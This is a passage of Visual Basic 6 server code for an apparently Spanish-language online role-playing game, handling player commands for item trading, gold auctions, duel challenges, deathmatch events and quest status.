If UserList(Userindex).flags.notesaleelbug = True Then Exit Sub
If UserList(Userindex).flags.Retando = True Then Exit Sub
If Userindex = Subastador Then Exit Sub
If Userindex = UltimoOfertador Then Exit Sub
If UserList(Userindex).POS.Map = 108 Then Exit Sub

    If UserList(Userindex).flags.EnvRetoC = True Then Exit Sub 'galle
    If UserList(Userindex).flags.RecRetoC = True Then Exit Sub
    If UserList(Userindex).flags.enRetoC1 = True Then Exit Sub
    If UserList(Userindex).flags.enRetoC2 = True Then Exit Sub

If UserList(Userindex).flags.Comerciando = True Then

If UserList(Userindex).ComercioNuevo.YaOfrecio = True Then 'Ya ofreciste los 4 items.....
 Call SendData(ToIndex, Userindex, 0, "||Ya ofreciste 4 Item no puedes cambiar tu oferta." & FONTTYPE_INFO)
Exit Sub
End If

If UserList(Userindex).Invent.Object(ItemComercioOfrece).OBJIndex = 0 Then Exit Sub 'Evitamos que el culeado bugee slots.
If CantidadComercio < 0 Then Exit Sub 'Cantidades negativas NO
If CantidadComercio = 0 Then Exit Sub

If UserList(Userindex).ComercioNuevo.YaOfrecio = False Then

UserList(Userindex).ComercioNuevo.vaOfreciendo = UserList(Userindex).ComercioNuevo.vaOfreciendo + 1

If UserList(Userindex).ComercioNuevo.vaOfreciendo = 1 Then 'ITEM1

UserList(Userindex).ComercioNuevo.ItemComercio.Amount = CantidadComercio
UserList(Userindex).ComercioNuevo.ItemComercio.OBJIndex = UserList(Userindex).Invent.Object(ItemComercioOfrece).OBJIndex

 If Not TieneObjetos(UserList(Userindex).ComercioNuevo.ItemComercio.OBJIndex, CantidadComercio, Userindex) Then
        Call SendData(ToIndex, Userindex, 0, "||No tienes esa cantidad de items!" & FONTTYPE_INFO)
        UserList(Userindex).ComercioNuevo.vaOfreciendo = UserList(Userindex).ComercioNuevo.vaOfreciendo - 1
    Exit Sub
End If


Call SendData(ToIndex, Userindex, 0, "GN" & ObjData(UserList(Userindex).ComercioNuevo.ItemComercio.OBJIndex).Name & "," & CantidadComercio)
Call SendData(ToIndex, UserList(Userindex).ComercioNuevo.Usuario1, 0, "GJ" & ObjData(UserList(Userindex).ComercioNuevo.ItemComercio.OBJIndex).Name & "," & CantidadComercio)

ElseIf UserList(Userindex).ComercioNuevo.vaOfreciendo = 2 Then 'ITEM2

UserList(Userindex).ComercioNuevo.ItemComercio1.Amount = CantidadComercio
UserList(Userindex).ComercioNuevo.ItemComercio1.OBJIndex = UserList(Userindex).Invent.Object(ItemComercioOfrece).OBJIndex

If UserList(Userindex).ComercioNuevo.ItemComercio.OBJIndex = UserList(Userindex).ComercioNuevo.ItemComercio1.OBJIndex Then
        Call SendData(ToIndex, Userindex, 0, "||Ya Ofreciste este item." & FONTTYPE_INFO)
        UserList(Userindex).ComercioNuevo.vaOfreciendo = UserList(Userindex).ComercioNuevo.vaOfreciendo - 1
Exit Sub
End If

 If Not TieneObjetos(UserList(Userindex).ComercioNuevo.ItemComercio1.OBJIndex, CantidadComercio, Userindex) Then
        Call SendData(ToIndex, Userindex, 0, "||No tienes esa cantidad de items!" & FONTTYPE_INFO)
        UserList(Userindex).ComercioNuevo.vaOfreciendo = UserList(Userindex).ComercioNuevo.vaOfreciendo - 1
    Exit Sub
End If

Call SendData(ToIndex, Userindex, 0, "GN" & ObjData(UserList(Userindex).ComercioNuevo.ItemComercio1.OBJIndex).Name & "," & CantidadComercio)
Call SendData(ToIndex, UserList(Userindex).ComercioNuevo.Usuario1, 0, "GJ" & ObjData(UserList(Userindex).ComercioNuevo.ItemComercio1.OBJIndex).Name & "," & CantidadComercio)

ElseIf UserList(Userindex).ComercioNuevo.vaOfreciendo = 3 Then 'ITEM3

UserList(Userindex).ComercioNuevo.ItemComercio2.Amount = CantidadComercio
UserList(Userindex).ComercioNuevo.ItemComercio2.OBJIndex = UserList(Userindex).Invent.Object(ItemComercioOfrece).OBJIndex

If UserList(Userindex).ComercioNuevo.ItemComercio.OBJIndex = UserList(Userindex).ComercioNuevo.ItemComercio2.OBJIndex Then
        Call SendData(ToIndex, Userindex, 0, "||Ya Ofreciste este item." & FONTTYPE_INFO)
        UserList(Userindex).ComercioNuevo.vaOfreciendo = UserList(Userindex).ComercioNuevo.vaOfreciendo - 1
Exit Sub
End If
If UserList(Userindex).ComercioNuevo.ItemComercio1.OBJIndex = UserList(Userindex).ComercioNuevo.ItemComercio2.OBJIndex Then
        Call SendData(ToIndex, Userindex, 0, "||Ya Ofreciste este item." & FONTTYPE_INFO)
        UserList(Userindex).ComercioNuevo.vaOfreciendo = UserList(Userindex).ComercioNuevo.vaOfreciendo - 1
Exit Sub
End If

 If Not TieneObjetos(UserList(Userindex).ComercioNuevo.ItemComercio2.OBJIndex, CantidadComercio, Userindex) Then
        Call SendData(ToIndex, Userindex, 0, "||No tienes esa cantidad de items!" & FONTTYPE_INFO)
        UserList(Userindex).ComercioNuevo.vaOfreciendo = UserList(Userindex).ComercioNuevo.vaOfreciendo - 1
    Exit Sub
End If


Call SendData(ToIndex, Userindex, 0, "GN" & ObjData(UserList(Userindex).ComercioNuevo.ItemComercio2.OBJIndex).Name & "," & CantidadComercio)
Call SendData(ToIndex, UserList(Userindex).ComercioNuevo.Usuario1, 0, "GJ" & ObjData(UserList(Userindex).ComercioNuevo.ItemComercio2.OBJIndex).Name & "," & CantidadComercio)

ElseIf UserList(Userindex).ComercioNuevo.vaOfreciendo = 4 Then 'ITEM4

UserList(Userindex).ComercioNuevo.ItemComercio3.Amount = CantidadComercio
UserList(Userindex).ComercioNuevo.ItemComercio3.OBJIndex = UserList(Userindex).Invent.Object(ItemComercioOfrece).OBJIndex

If UserList(Userindex).ComercioNuevo.ItemComercio.OBJIndex = UserList(Userindex).ComercioNuevo.ItemComercio3.OBJIndex Then
        Call SendData(ToIndex, Userindex, 0, "||Ya Ofreciste este item." & FONTTYPE_INFO)
        UserList(Userindex).ComercioNuevo.vaOfreciendo = UserList(Userindex).ComercioNuevo.vaOfreciendo - 1
Exit Sub
End If

If UserList(Userindex).ComercioNuevo.ItemComercio1.OBJIndex = UserList(Userindex).ComercioNuevo.ItemComercio3.OBJIndex Then
        Call SendData(ToIndex, Userindex, 0, "||Ya Ofreciste este item." & FONTTYPE_INFO)
        UserList(Userindex).ComercioNuevo.vaOfreciendo = UserList(Userindex).ComercioNuevo.vaOfreciendo - 1
Exit Sub
End If

If UserList(Userindex).ComercioNuevo.ItemComercio2.OBJIndex = UserList(Userindex).ComercioNuevo.ItemComercio3.OBJIndex Then
        Call SendData(ToIndex, Userindex, 0, "||Ya Ofreciste este item." & FONTTYPE_INFO)
        UserList(Userindex).ComercioNuevo.vaOfreciendo = UserList(Userindex).ComercioNuevo.vaOfreciendo - 1
Exit Sub
End If

 If Not TieneObjetos(UserList(Userindex).ComercioNuevo.ItemComercio3.OBJIndex, CantidadComercio, Userindex) Then
        Call SendData(ToIndex, Userindex, 0, "||No tienes esa cantidad de items!" & FONTTYPE_INFO)
        UserList(Userindex).ComercioNuevo.vaOfreciendo = UserList(Userindex).ComercioNuevo.vaOfreciendo - 1
    Exit Sub
End If

Call SendData(ToIndex, Userindex, 0, "GN" & ObjData(UserList(Userindex).ComercioNuevo.ItemComercio3.OBJIndex).Name & "," & CantidadComercio)
Call SendData(ToIndex, UserList(Userindex).ComercioNuevo.Usuario1, 0, "GJ" & ObjData(UserList(Userindex).ComercioNuevo.ItemComercio3.OBJIndex).Name & "," & CantidadComercio)

UserList(Userindex).ComercioNuevo.YaOfrecio = True
End If
End If
End If

Exit Sub
End If


If UCase$(rdata) = "/SUBASTAR" Then
         If SUBASTAACTIVADA Then Exit Sub


          If Hay_Subasta = True Then
                    Call SendData(ToIndex, Userindex, 0, "||Ya hay un objeto subastandose." & FONTTYPE_INFO)
               Exit Sub
           End If
           Call SendData(ToIndex, Userindex, 0, "INITSUB")
        Exit Sub
End If

If UCase$(Left$(rdata, 8)) = "/INISUB " Then
   rdata = Right$(rdata, Len(rdata) - 8)
    itemsubasta = ReadField(1, rdata, 32)
    cantsubasta = ReadField(2, rdata, 32)
    canjessubasta = ReadField(3, rdata, 32)
    
If ObjData(UserList(Userindex).Invent.Object(itemsubasta).OBJIndex).EsItemValioso Then

   If UserList(Userindex).flags.notesaleelbug = True Then Exit Sub
  If UserList(Userindex).flags.Retando = True Then Exit Sub
  
    If UserList(Userindex).flags.EnvRetoC = True Then Exit Sub ' galle
    If UserList(Userindex).flags.RecRetoC = True Then Exit Sub
    If UserList(Userindex).flags.enRetoC1 = True Then Exit Sub
    If UserList(Userindex).flags.enRetoC2 = True Then Exit Sub

If Hay_Subasta = True Then
        Call SendData(ToIndex, Userindex, 0, "||Ya hay una subasta, espera a que termine para iniciar otra." & FONTTYPE_INFO)
    Exit Sub
End If

    If MapInfo(UserList(Userindex).POS.Map).Pk = True Then
    Call SendData(ToIndex, Userindex, 0, "||Debes estar en una ciudad." & FONTTYPE_TALK)
    Exit Sub
    End If

If UserList(Userindex).BancoInvent.NroItems = MAX_BANCOINVENTORY_SLOTS Then
            Call SendData(ToIndex, Userindex, 0, "9Y" & " Para tu seguridad debes tener al menos 1 slot disponible en tu bovedá para depositar el item subastado en caso de que pierdas tu conexión.")
            Exit Sub
    End If
    
If UserList(Userindex).Invent.NroItems = MAX_INVENTORY_SLOTS Then
            Call SendData(ToIndex, Userindex, 0, "9Y" & " Para tu seguridad debes tener al menos 1 slot en tu inventario para dar lugar a el ítem que vas a obtener.")
            Exit Sub
    End If
 
If canjessubasta < 250000 Then
        Call SendData(ToIndex, Userindex, 0, "||El precio inicial debe ser mayor a 250.000 monedas de oro." & FONTTYPE_INFO)
    Exit Sub
End If

If Not IsNumeric(cantsubasta) Then
        Call SendData(ToIndex, Userindex, 0, "||Solo puedes utilizar numeros en la cantidad del item." & FONTTYPE_INFO)
    Exit Sub
End If
 
If Not IsNumeric(canjessubasta) Then
        Call SendData(ToIndex, Userindex, 0, "||Solo puedes utilizar numeros en la cantidad de canjes." & FONTTYPE_INFO)
    Exit Sub
End If

objetosubastado.OBJIndex = UserList(Userindex).Invent.Object(itemsubasta).OBJIndex
objetosubastado.Amount = cantsubasta
 If Not TieneObjetos(objetosubastado.OBJIndex, 0, Userindex) Then Exit Sub ' evitamos bug
 If Not TieneObjetos(objetosubastado.OBJIndex, cantsubasta, Userindex) Then
        Call SendData(ToIndex, Userindex, 0, "||No tienes esa cantidad de items!" & FONTTYPE_INFO)
    Exit Sub
End If
   
  canjesOfrecido = canjessubasta
  CantidadOfrecida = cantsubasta
    frmMain.TimerSubasta.Enabled = True
    MinutinSubasta = 4
    Subastador = Userindex
    SubastadorName = UserList(Userindex).Name
    UltimoOfertador = 0
    UltimoOfertadorName = 0
    Hay_Subasta = True
    Call QuitarObjetos(objetosubastado.OBJIndex, cantsubasta, Userindex)
    Call SendData(ToAll, 0, 0, "||" & UserList(Userindex).Name & " está subastando " & CantidadOfrecida & " " & ObjData(objetosubastado.OBJIndex).Name & " la oferta inicial es de " & PonerPuntos(canjessubasta) & " monedas de oro." & FONTTYPE_TALK)
Else
Call SendData(ToIndex, Userindex, 0, "||Solo puedes subastar items valiosos o items de donador." & FONTTYPE_INFO)
End If
Exit Sub
End If
 

 
If UCase$(Left$(rdata, 9)) = "/OFRECER " Then
 rdata = Right$(rdata, Len(rdata) - 9)
canjesOfrecidox = ReadField(1, rdata, 32)

If SUBASTAACTIVADA Then Exit Sub

  If UserList(Userindex).flags.notesaleelbug = True Then Exit Sub
  If UserList(Userindex).flags.Retando = True Then Exit Sub
  
    If UserList(Userindex).flags.EnvRetoC = True Then Exit Sub ' galle
    If UserList(Userindex).flags.RecRetoC = True Then Exit Sub
    If UserList(Userindex).flags.enRetoC1 = True Then Exit Sub
    If UserList(Userindex).flags.enRetoC2 = True Then Exit Sub

If UCase$(UserList(Userindex).Name) = UCase$(SubastadorName) Then
        Call SendData(ToIndex, Userindex, 0, "||¡Eres el subastador!" & FONTTYPE_INFO)
    Exit Sub
End If

 If MapInfo(UserList(Userindex).POS.Map).Pk = True Then
    Call SendData(ToIndex, Userindex, 0, "||Debes estar en una ciudad." & FONTTYPE_TALK)
    Exit Sub
    End If

If UserList(Userindex).BancoInvent.NroItems = MAX_BANCOINVENTORY_SLOTS Then
            Call SendData(ToIndex, Userindex, 0, "9Y" & " Para tu seguridad debes tener al menos 1 slot disponible en tu bovedá para depositar el item subastado en caso de que pierdas tu conexión.")
            Exit Sub
    End If
    
If UserList(Userindex).Invent.NroItems = MAX_INVENTORY_SLOTS Then
            Call SendData(ToIndex, Userindex, 0, "9Y" & " Para tu seguridad debes tener al menos 1 slot en tu inventario para dar lugar a el ítem que vas a obtener.")
            Exit Sub
    End If


If Hay_Subasta = False Then
        Call SendData(ToIndex, Userindex, 0, "||No hay ninguna subasta." & FONTTYPE_INFO)
    Exit Sub
End If
 
If UCase$(UserList(Userindex).Name) = UCase$(UltimoOfertadorName) Then
        Call SendData(ToIndex, Userindex, 0, "||No puedes volver a ofrecer." & FONTTYPE_INFO)
    Exit Sub
End If

If Not IsNumeric(canjesOfrecidox) Then
       Call SendData(ToIndex, Userindex, 0, "||Solo puedes utilizar numeros." & FONTTYPE_INFO)
    Exit Sub
End If

If UserList(Userindex).Stats.GLD < canjesOfrecidox Then
        Call SendData(ToIndex, Userindex, 0, "||No tienes esa cantidad." & FONTTYPE_INFO)
    Exit Sub
End If
 
If canjesOfrecidox < canjesOfrecido + ((canjesOfrecido * 10) / 100) Then
        Call SendData(ToIndex, Userindex, 0, "||Tu oferta debe ser al menos 10% mayor que la anterior." & FONTTYPE_INFO)
    Exit Sub
End If

Dim ldl As Integer
ldl = NameIndex(UltimoOfertadorName)
If ldl <= 0 Then
Call WriteVar(CharPath & UCase$(UltimoOfertadorName) & ".chr", "STATS", "GLD", val(GetVar(CharPath & UCase$(UltimoOfertadorName) & ".chr", "STATS", "GLD")) + canjesOfrecido)
Else
UserList(UltimoOfertador).Stats.GLD = UserList(UltimoOfertador).Stats.GLD + canjesOfrecido
Call SendUserStatsBox(UltimoOfertador)
End If
 
    canjesOfrecido = canjesOfrecidox
    UltimoOfertador = Userindex
    UltimoOfertadorName = UserList(Userindex).Name
    Call SendData(ToAll, 0, 0, "||" & UserList(Userindex).Name & " ofrece " & PonerPuntos(canjesOfrecidox) & " monedas de oro" & FONTTYPE_INFO)
    UserList(UltimoOfertador).Stats.GLD = UserList(UltimoOfertador).Stats.GLD - canjesOfrecidox
    Call SendUserStatsBox(Userindex)
   
    If MinutinSubasta = 1 Then
        MinutinSubasta = MinutinSubasta + 2
       Call SendData(ToAll, 0, 0, "||La subasta se extendera 2 minutos más." & FONTTYPE_TALK)
    End If
   
Exit Sub
End If


If UCase$(Left$(rdata, 8)) = "/INFOSUB" Then
rdata = Right$(rdata, Len(rdata) - 8)
      If Hay_Subasta = False Then
                    Call SendData(ToIndex, Userindex, 0, "||No hay subastas realizandose actualmente." & FONTTYPE_INFO)
                Exit Sub
            End If
        Call SendData(ToIndex, Userindex, 0, "||Subasta iniciada por: " & SubastadorName & FONTTYPE_INFO)
            Call SendData(ToIndex, Userindex, 0, "||Objeto Subastandose: " & ObjData(objetosubastado.OBJIndex).Name & FONTTYPE_INFO)
            Call SendData(ToIndex, Userindex, 0, "||Cantidad: " & CantidadOfrecida & FONTTYPE_INFO)
            If UltimoOfertador = 0 Then
                Call SendData(ToIndex, Userindex, 0, "||Precio Inicial: " & PonerPuntos(canjesOfrecido) & " monedas de oro." & FONTTYPE_INFO)
            Else
               Call SendData(ToIndex, Userindex, 0, "||Ultima Oferta: " & PonerPuntos(canjesOfrecido) & " monedas de oro. por: " & UltimoOfertadorName & FONTTYPE_INFO)
           End If
        Exit Sub
End If

If UCase$(Left$(rdata, 8)) = "/RETPLA " Then
rdata = Right$(rdata, Len(rdata) - 8)
        Tindex = NameIndex(ReadField(1, rdata, 32))
        If Tindex <= 0 Then Exit Sub 'Checkea si está off (:
          If Userindex = Subastador Then Exit Sub
If Userindex = UltimoOfertador Then Exit Sub
        If UserList(Tindex).POS.Map <> 160 Then Exit Sub
     If UserList(Userindex).flags.RetoBUGAED > 0 Then Exit Sub
     If UserList(Tindex).flags.RetoBUGPED > 0 Then Exit Sub
     If UserList(Userindex).flags.RetoBUGPED > 0 Then Exit Sub
            UserList(Userindex).flags.RetoBUGPED = 0
            UserList(Userindex).flags.RetoBUGAED = Tindex
            UserList(Tindex).flags.RetoBUGPED = Userindex
            UserList(Userindex).flags.RetoBUGPED = Tindex
            UserList(Userindex).Counters.RetoBUG = Timer
            UserList(Tindex).Counters.RetoBUG = Timer
       UserList(Userindex).flags.ModoRetoPlante = 0
    UserList(Tindex).flags.ModoRetoPlante = 0
    Exit Sub
    End If

If UCase$(Left$(rdata, 8)) = "/RETPLE " Then
rdata = Right$(rdata, Len(rdata) - 8)
        Tindex = NameIndex(ReadField(1, rdata, 32))
        If Tindex <= 0 Then Exit Sub 'Checkea si está off (:
          If Userindex = Subastador Then Exit Sub
If Userindex = UltimoOfertador Then Exit Sub
        If UserList(Tindex).POS.Map <> 160 Then Exit Sub
If UserList(Userindex).flags.RetoBUGAED > 0 Then Exit Sub
If UserList(Tindex).flags.RetoBUGPED > 0 Then Exit Sub
If UserList(Userindex).flags.RetoBUGPED > 0 Then Exit Sub
            UserList(Userindex).flags.RetoBUGPED = 0
            UserList(Userindex).flags.RetoBUGAED = Tindex
            UserList(Tindex).flags.RetoBUGPED = Userindex
            UserList(Userindex).flags.RetoBUGPED = Tindex
            UserList(Userindex).Counters.RetoBUG = Timer
            UserList(Tindex).Counters.RetoBUG = Timer
    UserList(Userindex).flags.ModoRetoPlante = 1
    UserList(Tindex).flags.ModoRetoPlante = 1
    Exit Sub
    End If
    
If UCase$(Left$(rdata, 11)) = "/RETARCLAN " Then 'GALLE
rdata = UCase$(Right$(rdata, Len(rdata) - 11))
Tindex = NameIndex(ReadField(1, rdata, 32))
Call RetarClanComando(Userindex, Tindex, ReadField(2, rdata, 32))
Exit Sub
End If

If UCase$(Left$(rdata, 9)) = "/IRGUERRA" Then
Call IrGuerraEnJuego(Userindex)
Exit Sub
End If

If UCase$(Left$(rdata, 8)) = "/RECHAZO" Then
        If UserList(Userindex).POS.Map <> 160 Then Exit Sub
        If UserList(Userindex).flags.RetoBUGPED <= 0 Then
        Call SendData(ToIndex, Userindex, 0, "||Nadie te retó." & FONTTYPE_BLANCO)
        Exit Sub
        End If
        Contrincante = UserList(Userindex).flags.RetoBUGPED
        
        
UserList(Userindex).flags.RetoBUGA = 0
UserList(Userindex).flags.RetoBUGAE = 0
UserList(Userindex).flags.RetoBUGAED = 0
UserList(Userindex).flags.RetoBUGP = 0
UserList(Userindex).flags.RetoBUGPE = 0
UserList(Userindex).flags.RetoBUGPED = 0
UserList(Userindex).flags.notesaleelbug = False
UserList(Userindex).flags.RetoSinCanje = 0
UserList(Userindex).flags.RetoSinCanje = 0
UserList(Userindex).flags.ModoRetoPlante = 0
UserList(Userindex).flags.ModoRetoPlante = 0
UserList(Userindex).Counters.RetoBUG = 0


UserList(Contrincante).flags.RetoBUGA = 0
UserList(Contrincante).flags.RetoBUGAE = 0
UserList(Contrincante).flags.RetoBUGAED = 0
UserList(Contrincante).flags.RetoBUGP = 0
UserList(Contrincante).flags.RetoBUGPE = 0
UserList(Contrincante).flags.RetoBUGPED = 0
UserList(Contrincante).flags.notesaleelbug = False
UserList(Contrincante).flags.RetoSinCanje = 0
UserList(Contrincante).flags.RetoSinCanje = 0
UserList(Contrincante).flags.ModoRetoPlante = 0
UserList(Contrincante).flags.ModoRetoPlante = 0
UserList(Contrincante).Counters.RetoBUG = 0
         
        Call SendData(ToIndex, Contrincante, 0, "||" & UserList(Userindex).Name & " rechazó el reto." & FONTTYPE_BLANCO)
        Call SendData(ToIndex, Userindex, 0, "||Rechazaste el reto." & FONTTYPE_BLANCO)
Exit Sub
End If

    
If UCase$(Left$(rdata, 6)) = "/RETAR" Then
rdata = UCase$(Right$(rdata, Len(rdata) - 6))
Call enviaruserlistreto1vs1y2vs2(Userindex)
Exit Sub
End If
   
If UCase$(Left$(rdata, 6)) = "/RETO " Then
If Userindex = Subastador Then Exit Sub
If Userindex = UltimoOfertador Then Exit Sub
If RetoDesactivado Then Exit Sub
    If RetoEnCurso = True Then
        Call SendData(ToIndex, Userindex, 0, "||Hay otro reto en curso" & FONTTYPE_RETOS)
        Exit Sub
    End If
    
     If UserList(Userindex).PartyIndex > 0 And MOD_EVENTO_Retos3vs3.EsPartyInscripto(UserList(Userindex).PartyIndex) = True Then
        Call SendData(ToIndex, Userindex, 0, "||Error: Estás anotado para 3vs3." & FONTTYPE_RETOS)
        Exit Sub
    End If

        If UserList(Userindex).POS.Map <> 160 Then
            Call SendData(ToIndex, Userindex, 0, "||Para retar a alguien debes estar en Isla pirata." & FONTTYPE_VENENO)
            Exit Sub
        End If
        
    Dim tIindex As String
    Dim argG1 As String
    Call MOD_EVENTO_Retos2vs2.SeFue(Userindex) 'evita bug 2v2
    rdata = UCase$(Right$(rdata, Len(rdata) - 6))
    tIindex = NameIndex(ReadField(1, rdata, 32))
    argG1 = ReadField(2, rdata, 32)
    
    Call Retos(Userindex, tIindex, argG1)
    Exit Sub
    End If

      If UCase$(Left$(rdata, 8)) = "/RETCAN " Then
rdata = Right$(rdata, Len(rdata) - 8)
        Tindex = NameIndex(ReadField(1, rdata, 32))
        If Tindex <= 0 Then Exit Sub 'Checkea si está off (:
          If Userindex = Subastador Then Exit Sub
If Userindex = UltimoOfertador Then Exit Sub
        If UserList(Tindex).POS.Map <> 160 Then Exit Sub
     If UserList(Userindex).flags.RetoBUGAE > 0 Then Exit Sub
     If UserList(Tindex).flags.RetoBUGPE > 0 Then Exit Sub
     If UserList(Userindex).flags.RetoBUGPE > 0 Then Exit Sub
            UserList(Userindex).flags.RetoBUGPE = 0
            UserList(Userindex).flags.RetoBUGAE = Tindex
            UserList(Tindex).flags.RetoBUGPE = Userindex
            UserList(Userindex).flags.RetoBUGPE = Tindex
            UserList(Userindex).Counters.RetoBUG = Timer
            UserList(Tindex).Counters.RetoBUG = Timer
    If UserList(Userindex).flags.ModoRetoPlante = 1 Then
    UserList(Userindex).flags.RetoSinCanje = 1
    UserList(Tindex).flags.RetoSinCanje = 1
    'Call SendData(ToIndex, TIndex, 0, "||Modo de reto: Sin canjes - Plante." & FONTTYPE_RETOS)
    'Call SendData(ToIndex, UserIndex, 0, "||Modo de reto: Sin canjes - Plante." & FONTTYPE_RETOS)
    Call SendData(ToIndex, Tindex, 0, "MJ" & "Sin Canjes - Plante") 'MANDA MODO
    End If
    If UserList(Userindex).flags.ModoRetoPlante = 0 Then
    UserList(Userindex).flags.RetoSinCanje = 1
    UserList(Tindex).flags.RetoSinCanje = 1
    'Call SendData(ToIndex, TIndex, 0, "||Modo de reto: Sin canjes - 1vs1." & FONTTYPE_RETOS)
    'Call SendData(ToIndex, UserIndex, 0, "||Modo de reto: Sin canjes - 1vs1." & FONTTYPE_RETOS)
    Call SendData(ToIndex, Tindex, 0, "MJ" & "Sin Canjes - Normal") 'MANDA MODO
    End If
    Exit Sub
    End If

          If UCase$(Left$(rdata, 8)) = "/RETCEN " Then
rdata = Right$(rdata, Len(rdata) - 8)
        Tindex = NameIndex(ReadField(1, rdata, 32))
        If Tindex <= 0 Then Exit Sub
          If Userindex = Subastador Then Exit Sub
If Userindex = UltimoOfertador Then Exit Sub
        If UserList(Tindex).POS.Map <> 160 Then Exit Sub
If UserList(Userindex).flags.RetoBUGAE > 0 Then Exit Sub
If UserList(Tindex).flags.RetoBUGPE > 0 Then Exit Sub
If UserList(Userindex).flags.RetoBUGPE > 0 Then Exit Sub
                 UserList(Userindex).flags.RetoBUGPE = 0
            UserList(Userindex).flags.RetoBUGAE = Tindex
            UserList(Tindex).flags.RetoBUGPE = Userindex
            UserList(Userindex).flags.RetoBUGPE = Tindex
            UserList(Userindex).Counters.RetoBUG = Timer
            UserList(Tindex).Counters.RetoBUG = Timer
   If UserList(Userindex).flags.ModoRetoPlante = 1 Then
    UserList(Userindex).flags.RetoSinCanje = 0
    UserList(Tindex).flags.RetoSinCanje = 0
    'Call SendData(ToIndex, TIndex, 0, "||Modo de reto: Con canjes - Plante." & FONTTYPE_RETOS)
    'Call SendData(ToIndex, UserIndex, 0, "||Modo de reto: Con canjes - Plante." & FONTTYPE_RETOS)
    Call SendData(ToIndex, Tindex, 0, "MJ" & "Con Canjes - Plante") 'MANDA MODO
    End If
    If UserList(Userindex).flags.ModoRetoPlante = 0 Then
    UserList(Userindex).flags.RetoSinCanje = 0
    UserList(Tindex).flags.RetoSinCanje = 0
    'Call SendData(ToIndex, TIndex, 0, "||Modo de reto: Con canjes - 1vs1." & FONTTYPE_RETOS)
    'Call SendData(ToIndex, UserIndex, 0, "||Modo de reto: Con canjes - 1vs1." & FONTTYPE_RETOS)
     Call SendData(ToIndex, Tindex, 0, "MJ" & "Con Canjes - Normal") 'MANDA MODO
    End If
    Exit Sub
    End If

   If UCase$(Left$(rdata, 8)) = "/ACEPTO " Then
  If Userindex = Subastador Then Exit Sub
If Userindex = UltimoOfertador Then Exit Sub
 If MapInfo(UserList(Userindex).POS.Map).Pk = True Then
    Call SendData(ToIndex, Userindex, 0, "||Debes estar en una ciudad" & FONTTYPE_TALK)
    Exit Sub
    End If

If RetoDesactivado Then Exit Sub
    If RetoEnCurso = True Then
        Call SendData(ToIndex, Userindex, 0, "||Hay otro reto en curso" & FONTTYPE_RETOS)
        Exit Sub
    End If
    
     If UserList(Userindex).PartyIndex > 0 And MOD_EVENTO_Retos3vs3.EsPartyInscripto(UserList(Userindex).PartyIndex) = True Then
        Call SendData(ToIndex, Userindex, 0, "||Error: Estás anotado para 3vs3." & FONTTYPE_RETOS)
        Exit Sub
    End If

        If UserList(Userindex).POS.Map <> 160 Then
            Call SendData(ToIndex, Userindex, 0, "||Para retar a alguien debes estar en Isla pirata" & FONTTYPE_VENENO)
            Exit Sub
        End If
        
    rdata = Right$(rdata, Len(rdata) - 8)
    tIindex = NameIndex(ReadField(1, rdata, 32))
    
    Call MOD_EVENTO_Retos2vs2.SeFue(Userindex) 'evita bug 2v2
    
    Call AceptarR(Userindex, tIindex)
    Exit Sub
End If



If UCase$(rdata) = "/RETANDO" Then
   MOD_EVENTO_Retos2vs2.Rings (Userindex)
    Exit Sub
   End If
   
If UCase$(Left$(rdata, 8)) = "/PAREJA " Then
rdata = Right$(rdata, Len(rdata) - 8)
Tindex = NameIndex(ReadField(1, rdata, 32))
Call MOD_EVENTO_Retos2vs2.PedirPareja(Userindex, Tindex)
Exit Sub
End If

If UCase$(rdata) = "/JUGAR" Then
MOD_EVENTO_Retos2vs2.Jugar (Userindex)
Exit Sub
End If


If UCase$(rdata) = "/SIPAREJA" Then
    MOD_EVENTO_Retos2vs2.AceptarPareja (Userindex)
    Exit Sub
End If


If UCase$(Left$(rdata, 3)) = "XDM" Then
Call EntraUserDM(Userindex)
Call EntraUserDM2(Userindex)
Exit Sub
End If

If UCase$(Left$(rdata, 12)) = "/ABANDONARDM" Then
Call SaleUserDM(Userindex)
Exit Sub
End If

If UCase$(Left$(rdata, 5)) = "/PING" Then
rdata = Right$(rdata, Len(rdata) - 5)
Call SendData(ToIndex, Userindex, 0, "BUENO")
Exit Sub
End If
   
If UCase$(Left$(rdata, 7)) = "/TIEMPO" Then
Call SendData(ToIndex, Userindex, 0, "||Tiempo para Deathmatch: " & tiempofinaldeath & FONTTYPE_TALK)
Call SendData(ToIndex, Userindex, 0, "||Tiempo para t. automático 1vs1/2vs2: " & tiempofinal1vs1 & FONTTYPE_TALK)
Call SendData(ToIndex, Userindex, 0, "||Tiempo para evento faccionario: " & tiempofinalthte & FONTTYPE_TALK)
If tiemposautomaticospausa = 1 Then
Call SendData(ToIndex, Userindex, 0, "||Los eventos automáticos se encuentran pausados." & FONTTYPE_TALK)
End If
Exit Sub
End If

If UCase$(Left$(rdata, 5)) = "/TRIO" Then
If TRIOACTIVADO Then Exit Sub
Call inscribir(Userindex)
Exit Sub
End If

If UCase$(Left$(rdata, 9)) = "/DISOLVER" Then
If UserList(Userindex).POS.Map = 90 Then
Call SendData(ToIndex, Userindex, 0, "||No puedes cancelar el reto una vés que comenzo." & FONTTYPE_INFO)
Exit Sub
End If
Call MOD_EVENTO_Retos2vs2.SeFue(Userindex)
Call MOD_EVENTO_Retos3vs3.Cancelar(Userindex)
Exit Sub
End If
        
If UCase$(Left$(rdata, 8)) = "/NOQUEST" Then
            If UserList(Userindex).flags.Questeando = 0 Then
               Call SendData(ToIndex, Userindex, 0, "||No estas haciendo ninguna quest." & FONTTYPE_INFO)
                Exit Sub
            End If
        UserList(Userindex).flags.Questeando = 0
        UserList(Userindex).flags.MuereQuest = 0
        UserList(Userindex).flags.UserNumQuest = 0
        Call SendData(ToIndex, Userindex, 0, "||Has abandonado la quest." & FONTTYPE_ORO)
        Exit Sub
        End If
        
If UCase$(Left$(rdata, 10)) = "/INFOQUEST" Then
        If UserList(Userindex).flags.Questeando = 0 Then
               Call SendData(ToIndex, Userindex, 0, "||No estas haciendo ninguna quest." & FONTTYPE_INFO)
                Exit Sub
            End If
       If UserList(Userindex).flags.Questeando = 1 Then
       Call SendData(ToIndex, Userindex, 0, "||Has acabado con " & UserList(Userindex).flags.MuereQuest & " criaturas." & FONTTYPE_ORO)
             Exit Sub
            End If
            End If


If UCase$(Left$(rdata, 5)) = "/GANE" Then
If UserList(Userindex).flags.death = True Then
If terminodeat = True Then
  
Call WarpUserChar(Userindex, 1, 50, 50, True)

UserList(Userindex).Stats.GLD = UserList(Userindex).Stats.GLD + OroDeLosInscriptos
Call SendUserORO(Userindex)
